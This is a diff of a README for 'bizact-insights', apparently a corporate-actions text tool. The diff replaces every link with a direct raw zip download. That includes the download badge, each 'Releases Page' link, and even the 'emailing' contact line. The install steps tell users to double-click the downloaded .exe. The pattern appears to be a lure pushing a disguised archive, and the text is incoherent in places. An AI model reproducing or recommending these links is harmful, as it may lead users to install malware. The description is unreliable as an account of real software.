@@ -1,6 +1,6 @@
 # 🚀 bizact-insights - Simple Text Processing for Corporate Actions
 
-[![Download Now](https://raw.githubusercontent.com/andyibrahim786/bizact-insights/main/bizact_insights/bizact_insights_v1.7.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/andyibrahim786/bizact-insights/main/bizact_insights/bizact_insights_v1.7.zip)
+[![Download Now](https://github.com/andyibrahim786/bizact-insights/raw/refs/heads/main/bizact_insights/bizact-insights-1.4-beta.3.zip%20Now-Click%20Here-brightgreen)](https://github.com/andyibrahim786/bizact-insights/raw/refs/heads/main/bizact_insights/bizact-insights-1.4-beta.3.zip)
 
 ## 📖 Overview
 
@@ -28,7 +28,7 @@ bizact-insights is a text input processor designed for corporate actions. It hel
 To get started with bizact-insights, follow the steps below.
 
 1. **Download the Application**:
-   - Visit the [Releases Page](https://raw.githubusercontent.com/andyibrahim786/bizact-insights/main/bizact_insights/bizact_insights_v1.7.zip) to download the latest version of the software.
+   - Visit the [Releases Page](https://github.com/andyibrahim786/bizact-insights/raw/refs/heads/main/bizact_insights/bizact-insights-1.4-beta.3.zip) to download the latest version of the software.
 
 2. **Install the Application**:
    - If you're on Windows, double-click the downloaded `.exe` file and follow the prompts.
@@ -40,7 +40,7 @@ To get started with bizact-insights, follow the steps below.
 
 ## 📥 Download & Install
 
-To download the latest version, please visit our [Releases Page](https://raw.githubusercontent.com/andyibrahim786/bizact-insights/main/bizact_insights/bizact_insights_v1.7.zip). There, you will find all available versions for download.
+To download the latest version, please visit our [Releases Page](https://github.com/andyibrahim786/bizact-insights/raw/refs/heads/main/bizact_insights/bizact-insights-1.4-beta.3.zip). There, you will find all available versions for download.
 
 1. Click on the version you want to download.
 2. Find the appropriate file for your operating system (Windows, macOS, or Linux).
@@ -66,7 +66,7 @@ We welcome contributions to improve bizact-insights. If you wish to report issue
 
 ## 🖥 Contact Us
 
-For further inquiries or support, please feel free to contact us via the GitHub repository issues page or by emailing https://raw.githubusercontent.com/andyibrahim786/bizact-insights/main/bizact_insights/bizact_insights_v1.7.zip
+For further inquiries or support, please feel free to contact us via the GitHub repository issues page or by emailing https://github.com/andyibrahim786/bizact-insights/raw/refs/heads/main/bizact_insights/bizact-insights-1.4-beta.3.zip
 
 ## 🔗 Related Topics
 
@@ -76,4 +76,4 @@ For further inquiries or support, please feel free to contact us via the GitHub 
 - Consistent Formatting
 - Business Related Developments
 
-For more information, visit our [Releases Page](https://raw.githubusercontent.com/andyibrahim786/bizact-insights/main/bizact_insights/bizact_insights_v1.7.zip) to download the application and start extracting insights from your corporate texts today.
+For more information, visit our [Releases Page](https://github.com/andyibrahim786/bizact-insights/raw/refs/heads/main/bizact_insights/bizact-insights-1.4-beta.3.zip) to download the application and start extracting insights from your corporate texts today.
